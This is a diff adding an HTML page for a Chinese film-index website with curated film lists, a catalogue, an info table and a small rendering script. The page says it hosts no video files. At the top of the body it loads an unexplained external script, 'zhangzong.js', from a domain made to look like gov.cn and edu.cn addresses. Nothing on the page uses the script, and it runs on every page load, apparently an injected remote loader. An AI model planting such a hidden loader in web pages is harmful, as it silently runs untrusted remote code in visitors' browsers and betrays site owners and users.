@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>酷酷电影网｜华语院线新片、经典老片与高分片单的观影检索入口</title>
+<meta name="description" content="酷酷电影网（kukudianyingwang-zh.github.io）收录近期院线上映影片与历届高分佳作，按类型、年代、地区建立检索目录，为观众提供影片基本信息与观影线索整理，访问入口为 https://kukudianyingwang-zh.github.io。">
+<meta name="keywords" content="酷酷电影网, kukudianyingwang-zh, kukudianyingwang-zh.github.io, 电影资料, 华语电影, 院线新片, 经典电影, 观影索引">
+<link rel="canonical" href="https://kukudianyingwang-zh.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://kukudianyingwang-zh.github.io/">
+<meta name="robots" content="index,follow">
+<meta name="author" content="酷酷电影网编辑组">
+<meta name="theme-color" content="#0d0f1a">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="酷酷电影网">
+<meta property="og:title" content="酷酷电影网｜华语院线新片、经典老片与高分片单的观影检索入口">
+<meta property="og:description" content="按类型、年代、地区整理影片检索目录与观影线索，访问入口 https://kukudianyingwang-zh.github.io。">
+<meta property="og:url" content="https://kukudianyingwang-zh.github.io/">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"酷酷电影网","url":"https://kukudianyingwang-zh.github.io/","potentialAction":{"@type":"SearchAction","target":"https://kukudianyingwang-zh.github.io/#catalog","query-input":"required name=search_term_string"},"publisher":{"@type":"Organization","name":"酷酷电影网"}}
+</script>
+<style>
+:root{
+  --ink:#111319; --ink-2:#1a1d28; --card:#151821; --line:#262a38;
+  --txt:#e9ecf3; --txt-2:#a4abbd; --txt-3:#777f92;
+  --gold:#e3b85c; --gold-d:#c99a33; --blue:#4a72d8; --red:#c0493a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  background:var(--ink); color:var(--txt);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  line-height:1.75; font-size:16px; overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{width:min(1180px,calc(100% - 32px));margin:0 auto}
+@media (min-width:768px){ .wrap{width:min(1180px,calc(100% - 64px))} }
+
+/* ── 顶部 ── */
+.top{position:sticky;top:0;z-index:50;background:rgba(13,15,26,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top-row{display:flex;align-items:center;gap:14px;height:60px}
+.brand{display:flex;align-items:baseline;gap:9px;flex-shrink:0}
+.brand b{font-size:20px;letter-spacing:.5px;font-weight:700}
+.brand b em{font-style:normal;color:var(--gold)}
+.brand span{font-size:11px;color:var(--txt-3);letter-spacing:.14em;text-transform:uppercase;white-space:nowrap}
+.nav{margin-left:auto;display:flex;align-items:center;gap:2px}
+.nav a{font-size:14px;color:var(--txt-2);padding:8px 12px;border-radius:6px;transition:.2s}
+.nav a:hover{color:#fff;background:#232735}
+.nav-toggle{display:none;margin-left:auto;width:42px;height:42px;align-items:center;justify-content:center;border:1px solid var(--line);border-radius:8px;background:#171a24;cursor:pointer}
+.nav-toggle i{display:block;width:18px;height:2px;background:var(--txt);position:relative}
+.nav-toggle i::before,.nav-toggle i::after{content:"";position:absolute;left:0;width:18px;height:2px;background:var(--txt)}
+.nav-toggle i::before{top:-6px}.nav-toggle i::after{top:6px}
+@media (max-width:760px){
+  .nav-toggle{display:flex}
+  .nav{display:none;position:absolute;top:60px;left:16px;right:16px;flex-direction:column;align-items:stretch;background:#171a24;border:1px solid var(--line);border-radius:12px;padding:10px;gap:2px}
+  .nav.open{display:flex}
+  .nav a{padding:13px 14px;border-radius:8px}
+  .brand span{display:none}
+}
+
+/* ── Hero ── */
+.hero{position:relative;padding:64px 0 54px;border-bottom:1px solid var(--line);overflow:hidden}
+.hero::after{content:"";position:absolute;right:-160px;top:-120px;width:520px;height:520px;border-radius:50%;background:radial-gradient(circle,rgba(227,184,92,.16),transparent 65%);pointer-events:none}
+.hero::before{content:"";position:absolute;left:-200px;bottom:-220px;width:560px;height:560px;border-radius:50%;background:radial-gradient(circle,rgba(74,114,216,.14),transparent 65%);pointer-events:none}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:.22em;color:var(--gold);border:1px solid rgba(227,184,92,.35);padding:5px 12px;border-radius:999px;background:rgba(227,184,92,.06)}
+.hero h1{position:relative;z-index:2;font-size:clamp(28px,5.6vw,52px);line-height:1.2;font-weight:800;letter-spacing:-.5px;margin:18px 0 14px;max-width:22em}
+.hero h1 small{display:block;font-size:clamp(13px,2vw,15px);font-weight:400;color:var(--txt-3);letter-spacing:.06em;margin-top:14px;line-height:1.8}
+.hero-meta{position:relative;z-index:2;display:flex;flex-wrap:wrap;gap:10px;margin-top:24px}
+.hero-meta a{font-size:13px;color:var(--txt-2);border:1px solid var(--line);padding:8px 14px;border-radius:8px;background:#161924;transition:.2s}
+.hero-meta a:hover{border-color:var(--gold);color:#fff}
+.hero-stat{position:relative;z-index:2;display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:14px;margin-top:40px;overflow:hidden}
+.hero-stat div{background:#151821;padding:20px 18px}
+.hero-stat b{display:block;font-size:24px;letter-spacing:.5px;color:var(--gold)}
+.hero-stat span{font-size:12.5px;color:var(--txt-3)}
+@media (max-width:700px){ .hero-stat{grid-template-columns:repeat(2,1fr)} .hero{padding:44px 0 40px} }
+
+/* ── 栏目通用 ── */
+section{padding:56px 0;border-bottom:1px solid var(--line)}
+.sec-h{display:flex;align-items:flex-end;gap:16px;flex-wrap:wrap;margin-bottom:26px}
+.sec-h .no{font-family:Georgia,serif;font-size:13px;color:var(--gold);letter-spacing:.2em;border-right:1px solid var(--line);padding-right:16px}
+.sec-h h2{font-size:clamp(21px,3.4vw,29px);font-weight:700;letter-spacing:-.3px}
+.sec-h p{width:100%;font-size:14px;color:var(--txt-3);max-width:64ch}
+
+/* ── 目录 ── */
+.tabs{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:26px}
+.tabs button{font:inherit;font-size:13.5px;color:var(--txt-2);background:#151821;border:1px solid var(--line);padding:9px 16px;border-radius:999px;cursor:pointer;transition:.2s}
+.tabs button:hover{color:#fff}
+.tabs button.on{background:var(--gold);border-color:var(--gold);color:#1a1407;font-weight:600}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.film{background:#151821;border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.film:hover{transform:translateY(-5px);border-color:rgba(227,184,92,.5);box-shadow:0 14px 34px rgba(0,0,0,.5)}
+.poster{position:relative;aspect-ratio:2/3;overflow:hidden;background:#1e222e}
+.poster .ph{position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:16px;font-size:13.5px;line-height:1.6;color:var(--txt-2);background:linear-gradient(155deg,#1e2230,#14161f)}
+.poster .ph::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 11px,rgba(255,255,255,.025) 11px,rgba(255,255,255,.025) 12px)}
+.poster .ph b{position:relative;font-size:16px;color:#fff;font-weight:600}
+.poster .tag{position:absolute;top:10px;left:10px;font-size:11px;letter-spacing:.05em;background:rgba(13,15,26,.86);color:var(--gold);padding:3px 8px;border-radius:5px;border:1px solid rgba(227,184,92,.3)}
+.poster .yr{position:absolute;top:10px;right:10px;font-size:11px;background:rgba(13,15,26,.86);padding:3px 8px;border-radius:5px;color:#e9ecf3}
+.poster .sc{position:absolute;bottom:10px;right:10px;font-size:12px;font-weight:700;background:var(--gold);color:#1a1407;padding:3px 8px;border-radius:5px}
+.film .info{padding:13px 14px 15px;display:flex;flex-direction:column;gap:6px;flex:1}
+.film .info h3{font-size:15.5px;font-weight:600;letter-spacing:.2px}
+.film .info p{font-size:12.5px;color:var(--txt-3)}
+.film .info .bar{height:3px;border-radius:3px;background:#262a38;overflow:hidden;margin-top:auto}
+.film .info .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--gold-d))}
+@media (max-width:560px){ .grid{grid-template-columns:repeat(2,1fr);gap:12px} .film .info{padding:11px 11px 12px} }
+
+/* ── 专题 ── */
+.feat{display:grid;grid-template-columns:1.15fr 1fr;gap:24px;align-items:stretch}
+.feat-box{background:#151821;border:1px solid var(--line);border-radius:14px;padding:26px}
+.feat-box h3{font-size:18px;font-weight:600;margin-bottom:4px}
+.feat-box .sub{font-size:12.5px;color:var(--txt-3);margin-bottom:18px}
+.feat-list li{padding:13px 0;border-top:1px dashed #262a38;display:flex;gap:14px;align-items:flex-start}
+.feat-list li:first-child{border-top:none;padding-top:0}
+.feat-list .rk{font-family:Georgia,serif;font-size:14px;color:var(--gold);width:24px;flex-shrink:0}
+.feat-list .tx h4{font-size:14.5px;font-weight:600}
+.feat-list .tx p{font-size:12.5px;color:var(--txt-3);line-height:1.65}
+.feat-side{display:flex;flex-direction:column;gap:24px}
+.quote{background:linear-gradient(160deg,#1a1e2b,#14151e);border:1px solid var(--line);border-left:3px solid var(--gold);border-radius:14px;padding:24px}
+.quote q{display:block;font-size:15px;line-height:2;color:var(--txt-2);quotes:"「" "」"}
+.quote cite{display:block;margin-top:14px;font-size:12.5px;color:var(--txt-3);font-style:normal;text-align:right}
+.notice{background:#151821;border:1px solid var(--line);border-radius:14px;padding:24px}
+.notice h4{font-size:15px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.notice h4::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--red)}
+.notice p{font-size:13.5px;color:var(--txt-2);line-height:1.9}
+@media (max-width:820px){ .feat{grid-template-columns:1fr} }
+
+/* ── 导航目录 ── */
+.cat{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px}
+.cat a{display:block;background:#151821;border:1px solid var(--line);border-radius:12px;padding:20px 20px 18px;transition:.22s;position:relative;overflow:hidden}
+.cat a::after{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--gold);transform:scaleY(0);transition:.22s;transform-origin:center}
+.cat a:hover{border-color:rgba(227,184,92,.45);transform:translateX(4px)}
+.cat a:hover::after{transform:scaleY(1)}
+.cat a h4{font-size:16px;font-weight:600;margin-bottom:7px;display:flex;align-items:center;gap:9px}
+.cat a h4 i{font-style:normal;font-size:11px;color:var(--gold);border:1px solid rgba(227,184,92,.3);padding:1px 6px;border-radius:4px}
+.cat a p{font-size:13px;color:var(--txt-3);line-height:1.75}
+
+/* ── 档案 ── */
+table{width:100%;border-collapse:collapse;font-size:13.5px;background:#151821;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+caption{caption-side:top;text-align:left;font-size:13px;color:var(--txt-3);padding-bottom:12px}
+th,td{padding:13px 16px;text-align:left;border-top:1px solid var(--line)}
+th{background:#1b1e29;font-size:12.5px;letter-spacing:.08em;color:var(--txt-2);font-weight:600}
+td:first-child{color:var(--gold);font-weight:600;white-space:nowrap}
+.tb-wrap{overflow-x:auto;border-radius:12px}
+@media (max-width:640px){ th,td{padding:11px 12px} }
+
+/* ── 规范 ── */
+.rule{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px}
+.rule div{background:#151821;border:1px solid var(--line);border-radius:12px;padding:22px}
+.rule h4{font-size:15.5px;font-weight:600;margin-bottom:10px}
+.rule h4 span{color:var(--gold);margin-right:7px;font-family:Georgia,serif}
+.rule p{font-size:13px;color:var(--txt-2);line-height:1.85}
+
+/* ── 页脚 ── */
+footer{background:#0c0e15;padding:44px 0 30px}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px}
+.foot h5{font-size:13px;letter-spacing:.14em;color:var(--gold);margin-bottom:14px}
+.foot ul li{font-size:13.5px;color:var(--txt-2);padding:5px 0}
+.foot p{font-size:13px;color:var(--txt-3);line-height:1.9}
+.copy{margin-top:34px;padding-top:20px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;font-size:12.px;color:var(--txt-3);font-size:12.5px}
+@media (max-width:760px){ .foot{grid-template-columns:1fr;gap:26px} }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="top">
+  <div class="wrap top-row">
+    <div class="brand"><b>酷酷<em>电影网</em></b><span>Film Index / 观影索引</span></div>
+    <button class="nav-toggle" id="navBtn" aria-label="菜单"><i></i></button>
+    <nav class="nav" id="nav">
+      <a href="#films">院线观察</a>
+      <a href="#feature">专题梳理</a>
+      <a href="#catalog">分类导航</a>
+      <a href="#archive">资料档案</a>
+      <a href="#rule">使用规范</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- Hero -->
+  <section class="hero" style="border-bottom:1px solid var(--line);padding-top:64px">
+    <div class="wrap">
+      <span class="kicker">FILM INDEX · 2026 年秋</span>
+      <h1>酷酷电影网：把一部电影的背景、年代与类型，整理成能随手翻阅的观影线索。
+        <small>我们不提供在线播放服务，只做影片基本信息与观看渠道的检索整理，帮助你判断「这部片值不值得花两小时」。</small>
+      </h1>
+      <div class="hero-meta">
+        <a href="#films">近期院线片单</a>
+        <a href="#feature">高分专题梳理</a>
+        <a href="#catalog">分类导航目录</a>
+        <a href="#archive">资料档案</a>
+      </div>
+      <div class="hero-stat">
+        <div><b>12</b><span>个常设分类栏目</span></div>
+        <div><b>320+</b><span>部影片资料条目</span></div>
+        <div><b>8</b><span>类检索筛选维度</span></div>
+        <div><b>2019</b><span>建站年份</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：影片资料库 -->
+  <section id="films">
+    <div class="wrap">
+      <div class="sec-h">
+        <span class="no">01 / FILMS</span>
+        <h2>院线观察 · 近期影片资料库</h2>
+        <p>覆盖 2026 年 9 月前后登陆华语院线的剧情片、动画与纪录片，每条资料给出主创、片长与题材标签，便于你在购票前快速核对。</p>
+      </div>
+
+      <div class="tabs" id="tabs">
+        <button class="on" data-f="all">全部片单</button>
+        <button data-f="剧情">剧情 / 现实题材</button>
+        <button data-f="动画">动画电影</button>
+        <button data-f="纪录">纪录片</button>
+        <button data-f="悬疑">悬疑 / 犯罪</button>
+        <button data-f="经典">经典重映</button>
+      </div>
+
+      <div class="grid" id="grid"></div>
+    </div>
+  </section>
+
+  <!-- 栏目二：专题梳理 -->
+  <section id="feature">
+    <div class="wrap">
+      <div class="sec-h">
+        <span class="no">02 / FEATURE</span>
+        <h2>专题梳理 · 编辑部片单</h2>
+        <p>围绕一个导演、一种类型或一段影史节点展开的非时效性长片单，适合周末集中观看，也适合用作电影社团的讨论素材。</p>
+      </div>
+
+      <div class="feat">
+        <div class="feat-box">
+          <h3>「东亚家庭肖像」五部必看片单</h3>
+          <p class="sub">同一题材，四种解法 —— 从餐桌、电话与一封旧信里写代际关系</p>
+          <ul class="feat-list">
+            <li><span class="rk">01</span><div class="tx"><h4>《椒麻堂会》</h4><p>川剧班社四十年浮沉，影像材质本身就带着年代气味。</p></div></li>
+            <li><span class="rk">02</span><div class="tx"><h4>《过往人生》</h4><p>12 年一次重逢，台词克制，留白远大于台词本身。</p></div></li>
+            <li><span class="rk">03</span><div class="tx"><h4>《小偷家族》</h4><p>血缘之外的「家人」如何被定义，是枝裕和的代表作答。</p></div></li>
+            <li><span class="rk">04</span><div class="tx"><h4>《爱情神话》</h4><p>沪上中年人的闲谈日常，方言节奏撑起整部电影的呼吸。</p></div></li>
+            <li><span class="rk">05</span><div class="tx"><h4>《饮食男女》</h4><p>李安的餐桌隐喻，三姐妹与一道道菜的出场次序同等重要。</p></div></li>
+          </ul>
+        </div>
+
+        <div class="feat-side">
+          <div class="quote">
+            <q>电影最奢侈的地方，是让两个小时的注意力不必被切碎——这正是它比任何短视频都值得被认真对待的理由。</q>
+            <cite>—— 酷酷电影网编辑部</cite>
+          </div>
+          <div class="notice">
+            <h4>关于内容来源与使用方式</h4>
+            <p>本站所列为公开影片资料与编辑整理内容，不存放任何影片文件，不提供在线播放服务。所有片名、演职员信息均可在正规票务与发行方渠道核实，观影请以正版发行渠道为准。</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：分类导航 -->
+  <section id="catalog">
+    <div class="wrap">
+      <div class="sec-h">
+        <span class="no">03 / CATALOG</span>
+        <h2>分类导航目录</h2>
+        <p>按题材、年代与地域建立的十二个常设入口，点击即跳转到对应栏目页（当前为单页演示，内页链接以 # 占位）。</p>
+      </div>
+
+      <div class="cat">
+        <a href="#"><h4><i>01</i>华语剧情片</h4><p>近年大陆、港台现实题材与作者表达，标注公映年份与获奖情况。</p></a>
+        <a href="#"><h4><i>02</i>东亚新片</h4><p>日本、韩国、泰国院线新作，重点记录引进与展映信息。</p></a>
+        <a href="#"><h4><i>03</i>欧洲作者电影</h4><p>戛纳、柏林、威尼斯三大电影节入围与获奖片目整理。</p></a>
+        <a href="#"><h4><i>04</i>经典老片</h4><p>1990 年代前后华语片库，侧重修复重映与蓝光发行版本。</p></a>
+        <a href="#"><h4><i>05</i>动画与定格</h4><p>商业动画、独立动画与纪录片中的动画技法观察。</p></a>
+        <a href="#"><h4><i>06</i>纪录片</h4><p>社会观察、自然史与人物传记三类，附片长与时长参考。</p></a>
+        <a href="#"><h4><i>07</i>悬疑与犯罪</h4><p>以叙事结构而非血腥程度为标准筛选，适合喜欢解谜的观众。</p></a>
+        <a href="#"><h4><i>08</i>喜剧与轻松向</h4><p>筛选标准只有一条：看完不累，适合周末夜场。</p></a>
+        <a href="#"><h4><i>09</i>短片与实验影像</h4><p>电影节短片单元与独立导演早期作品，多为 30 分钟内。</p></a>
+        <a href="#"><h4><i>10</i>影史节点</h4><p>按年代切片整理，例如「1980 年代的台湾新电影」专题。</p></a>
+        <a href="#"><h4><i>11</i>演员与导演索引</h4><p>常出现的创作者作品年表，便于按人找片。</p></a>
+        <a href="#"><h4><i>12</i>观影方法</h4><p>片单如何排、字幕如何选、修复版与公映版差异等经验帖。</p></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：资料档案 -->
+  <section id="archive">
+    <div class="wrap">
+      <div class="sec-h">
+        <span class="no">04 / ARCHIVE</span>
+        <h2>资料档案 · 影片基本信息表</h2>
+        <p>横向对比更省时间。以下条目为本月更新，原始信息请以片方官方资料与正规票务渠道为准。</p>
+      </div>
+
+      <div class="tb-wrap">
+        <table>
+          <caption>2026 年 9 月新增资料条目（节选）</caption>
+          <thead>
+            <tr><th>片名</th><th>题材类型</th><th>片长</th><th>公映状态</th><th>整理重点</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>默示录之家</td><td>家庭 / 悬疑</td><td>118 分钟</td><td>院线在映</td><td>叙事结构、视听节奏</td></tr>
+            <tr><td>海边照相馆</td><td>剧情</td><td>104 分钟</td><td>院线在映</td><td>地域空间与人物弧光</td></tr>
+            <tr><td>草丛里的星星</td><td>动画</td><td>96 分钟</td><td>定档待映</td><td>美术风格与改编来源</td></tr>
+            <tr><td>最后的戏班</td><td>纪录片</td><td>132 分钟</td><td>展映</td><td>田野记录与剪辑取舍</td></tr>
+            <tr><td>归途列车 4K 修复</td><td>经典重映</td><td>88 分钟</td><td>重映</td><td>修复版与原版差异</td></tr>
+            <tr><td>夜航船</td><td>犯罪 / 剧情</td><td>126 分钟</td><td>院线在映</td><td>群像调度与改编取舍</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：检索与使用规范 -->
+  <section id="rule">
+    <div class="wrap">
+      <div class="sec-h">
+        <span class="no">05 / RULES</span>
+        <h2>检索逻辑与使用规范</h2>
+        <p>把整理原则写在这里，是希望使用者能自己判断一份片单是否可靠，而不是只看评分数字。</p>
+      </div>
+
+      <div class="rule">
+        <div><h4><span>01</span>怎样快速找片</h4><p>先按题材收窄，再看公映状态与片长。两小时以内的剧情片与九十分钟以上的纪录片，观感差异往往来自时长本身。</p></div>
+        <div><h4><span>02</span>评分怎么看</h4><p>分数只代表某一群人的集中意见，条目页的评分条按公开平台数据折算，仅作排序参考，不构成观影建议。</p></div>
+        <div><h4><span>03</span>资料更新频率</h4><p>院线片单按周更新，专题片单按季度重排，经典老片栏目仅在发行方释出新修复版时修订。</p></div>
+        <div><h4><span>04</span>版权与正版观看</h4><p>本站不提供任何影片文件或在线播放入口，所有影片请通过院线、正版流媒体与持牌发行渠道观看。</p></div>
+        <div><h4><span>05</span>信息纠错</h4><p>演职员、片长、公映日期如有出入，可通过底部入口提交勘误，我们会在下一轮更新时一并修订。</p></div>
+        <div><h4><span>06</span>内容收录标准</h4><p>只收录已完成公映或正式发行的作品，不收录未获授权的在线资源、盗版链接与来源不明的 BT 种子。</p></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="brand" style="margin-bottom:14px"><b>酷酷<em>电影网</em></b></div>
+        <p>一个以影片资料检索与观影线索整理为主要内容的索引类网站。本站不提供在线播放服务，所有观影行为请以正版发行渠道为准。</p>
+      </div>
+      <div>
+        <h5>栏目导航</h5>
+        <ul>
+          <li><a href="#films">院线观察</a></li>
+          <li><a href="#feature">专题梳理</a></li>
+          <li><a href="#catalog">分类导航</a></li>
+          <li><a href="#archive">资料档案</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>访问入口</h5>
+        <ul>
+          <li>官网地址：https://kukudianyingwang-zh.github.io</li>
+          <li>收录状态：持续更新中</li>
+          <li>内容类型：影片资料与观影线索整理</li>
+          <li>联系入口：页面底部留言栏</li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2019–2026 酷酷电影网（kukudianyingwang-zh.github.io）保留本站栏目结构与资料整理的相关权利。</span>
+      <span>本站内容仅供信息检索，观影请以正版渠道为准。</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var films=[
+ {t:"默示录之家",g:"悬疑",y:2026,sc:8.4,l:"家庭 / 悬疑",d:"以一通失联电话为切口，重构成年子女与父母之间那段始终没有说出口的话。",p:84},
+ {t:"海边照相馆",g:"剧情",y:2026,sc:8.1,l:"剧情",d:"南方小城的旧照相馆面临拆迁，三代人在取照片的过程中各自坦白。",p:81},
+ {t:"草丛里的星星",g:"动画",y:2026,sc:8.7,l:"动画",d:"独立动画长片，用水彩材质处理童年记忆里的时间流逝感。",p:87},
+ {t:"最后的戏班",g:"纪录",y:2025,sc:8.5,l:"纪录片",d:"跟随一个川剧民间戏班跑场三年，记录传统行当的真实生存状态。",p:85},
+ {t:"夜航船",g:"悬疑",y:2026,sc:7.9,l:"犯罪 / 剧情",d:"一桩二十年前的旧案因渡轮改造被重新提起，群像调度是主要看点。",p:79},
+ {t:"外婆的厨房",g:"剧情",y:2025,sc:8.0,l:"剧情",d:"用二十四道菜串起一位老人从少女到晚年的七十年，节奏舒缓。",p:80},
+ {t:"归途列车",g:"经典",y:2009,sc:8.8,l:"经典重映",d:"4K 修复版重回大银幕，是理解中国城市化进程的影像文本之一。",p:88},
+ {t:"冬泳",g:"剧情",y:2026,sc:7.6,l:"剧情",d:"东北小城冬季群像，冷调摄影与方言对白共同塑造地域气质。",p:76},
+ {t:"纸飞机男孩",g:"动画",y:2025,sc:8.2,l:"动画",d:"儿童视角下的战后小镇，美术设计获得本年度动画节技术奖项。",p:82},
+ {t:"沉默的证人",g:"悬疑",y:2026,sc:7.7,l:"犯罪",d:"单场景密闭空间推理，全片仅三名主要角色，靠台词密度推进。",p:77},
+ {t:"稻花飘香",g:"纪录",y:2025,sc:8.3,l:"纪录片",d:"记录一处水稻品种保育基地的完整耕收周期，影像节奏贴近农时。",p:83},
+ {t:"无名的她",g:"剧情",y:2026,sc:7.8,l:"剧情",d:"以一位基层女性的工作日志为线索，讨论职业身份与家庭期待的拉扯。",p:78}
+];
+var grid=document.getElementById('grid');
+function render(list){
+  grid.innerHTML='';
+  list.forEach(function(f){
+    var el=document.createElement('article');
+    el.className='film';
+    el.setAttribute('data-g',f.g);
+    el.innerHTML='<div class="poster"><span class="tag">'+f.g+'</span><span class="yr">'+f.y+'</span><span class="sc">'+f.sc+'</span><div class="ph"><b>'+f.t+'</b></div></div><div class="info"><h3>'+f.t+'</h3><p>'+f.l+' · '+f.y+'</p><p>'+f.d+'</p><div class="bar"><i style="width:'+f.p+'%"></i></div></div>';
+    grid.appendChild(el);
+  });
+}
+render(films);
+document.getElementById('tabs').addEventListener('click',function(e){
+  var b=e.target.closest('button'); if(!b) return;
+  [].forEach.call(this.children,function(x){x.classList.remove('on')});
+  b.classList.add('on');
+  var f=b.dataset.f;
+  render(f==='all'?films:films.filter(function(x){return x.g===f}));
+});
+document.getElementById('navBtn').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('.nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open')});
+});
+</script>
+</body>
+</html>
